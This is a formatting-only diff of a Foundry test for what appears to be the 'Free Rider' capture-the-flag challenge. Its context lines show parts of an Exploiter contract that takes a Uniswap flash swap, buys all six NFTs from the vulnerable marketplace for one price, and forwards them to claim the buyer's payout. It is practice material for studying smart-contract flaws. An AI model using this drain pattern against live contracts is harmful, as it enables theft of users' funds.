@@ -41,25 +41,16 @@ contract FreeRider is Test {
         /**
          * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
          */
-        buyer = payable(
-            address(uint160(uint256(keccak256(abi.encodePacked("buyer")))))
-        );
+        buyer = payable(address(uint160(uint256(keccak256(abi.encodePacked("buyer"))))));
         vm.label(buyer, "buyer");
         vm.deal(buyer, BUYER_PAYOUT);
 
-        deployer = payable(
-            address(uint160(uint256(keccak256(abi.encodePacked("deployer")))))
-        );
+        deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
         vm.label(deployer, "deployer");
-        vm.deal(
-            deployer,
-            UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE
-        );
+        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE);
 
         // Attacker starts with little ETH balance
-        attacker = payable(
-            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
-        );
+        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
         vm.label(attacker, "Attacker");
         vm.deal(attacker, 0.5 ether);
 
@@ -73,18 +64,11 @@ contract FreeRider is Test {
         vm.label(address(dvt), "DVT");
 
         // Deploy Uniswap Factory and Router
-        uniswapV2Factory = IUniswapV2Factory(
-            deployCode(
-                "./src/build-uniswap/v2/UniswapV2Factory.json",
-                abi.encode(address(0))
-            )
-        );
+        uniswapV2Factory =
+            IUniswapV2Factory(deployCode("./src/build-uniswap/v2/UniswapV2Factory.json", abi.encode(address(0))));
 
         uniswapV2Router = IUniswapV2Router02(
-            deployCode(
-                "./src/build-uniswap/v2/UniswapV2Router02.json",
-                abi.encode(address(uniswapV2Factory), address(weth))
-            )
+            deployCode("./src/build-uniswap/v2/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
         );
 
         // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
@@ -100,9 +84,7 @@ contract FreeRider is Test {
         );
 
         // Get a reference to the created Uniswap pair
-        uniswapV2Pair = IUniswapV2Pair(
-            uniswapV2Factory.getPair(address(dvt), address(weth))
-        );
+        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(dvt), address(weth)));
         vm.label(address(uniswapV2Pair), "Pair");
 
         assertEq(uniswapV2Pair.token0(), address(dvt));
@@ -119,14 +101,11 @@ contract FreeRider is Test {
             assertEq(damnValuableNFT.ownerOf(id), deployer);
         }
 
-        damnValuableNFT.setApprovalForAll(
-            address(freeRiderNFTMarketplace),
-            true
-        );
+        damnValuableNFT.setApprovalForAll(address(freeRiderNFTMarketplace), true);
 
         uint256[] memory NFTsForSell = new uint256[](6);
         uint256[] memory NFTsPrices = new uint256[](6);
-        for (uint8 i = 0; i < AMOUNT_OF_NFTS; ) {
+        for (uint8 i = 0; i < AMOUNT_OF_NFTS;) {
             NFTsForSell[i] = i;
             NFTsPrices[i] = NFT_PRICE;
             unchecked {
@@ -183,21 +162,14 @@ contract FreeRider is Test {
         // The buyer extracts all NFTs from its associated contract
         vm.startPrank(buyer);
         for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
-            damnValuableNFT.transferFrom(
-                address(freeRiderBuyer),
-                buyer,
-                tokenId
-            );
+            damnValuableNFT.transferFrom(address(freeRiderBuyer), buyer, tokenId);
             assertEq(damnValuableNFT.ownerOf(tokenId), buyer);
         }
         vm.stopPrank();
 
         // Exchange must have lost NFTs and ETH
         assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
-        assertLt(
-            address(freeRiderNFTMarketplace).balance,
-            MARKETPLACE_INITIAL_ETH_BALANCE
-        );
+        assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
     }
 }
 
@@ -214,7 +186,10 @@ contract Exploiter is Test {
         FreeRiderNFTMarketplace _marketplace,
         IUniswapV2Pair _pair,
         FreeRiderBuyer _buyerContract
-    ) public payable {
+    )
+        public
+        payable
+    {
         attacker = payable(msg.sender);
         token = _token;
         marketplace = _marketplace;
@@ -230,15 +205,10 @@ contract Exploiter is Test {
         pair.swap(0, 90 ether, address(this), abi.encode("data"));
     }
 
-    function uniswapV2Call(
-        address sender,
-        uint256 amount0,
-        uint256 amount1,
-        bytes calldata data
-    ) public {
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
         // 2. Buy all NFTs from marketplace
         uint256[] memory tokenIds = new uint256[](6);
-        for (uint256 i = 0; i < 6; ) {
+        for (uint256 i = 0; i < 6;) {
             tokenIds[i] = i;
             unchecked {
                 ++i;
@@ -249,7 +219,7 @@ contract Exploiter is Test {
         marketplace.buyMany{value: 15 ether}(tokenIds);
 
         // 3. Send all NFTs to buyer's contract
-        for (uint256 i = 0; i < 6; ) {
+        for (uint256 i = 0; i < 6;) {
             token.safeTransferFrom(address(this), address(buyerContract), i);
             unchecked {
                 ++i;
@@ -269,12 +239,7 @@ contract Exploiter is Test {
 
     fallback() external payable {}
 
-    function onERC721Received(
-        address,
-        address,
-        uint256 _tokenId,
-        bytes memory
-    ) external returns (bytes4) {
+    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) {
         return IERC721Receiver.onERC721Received.selector;
     }
 }
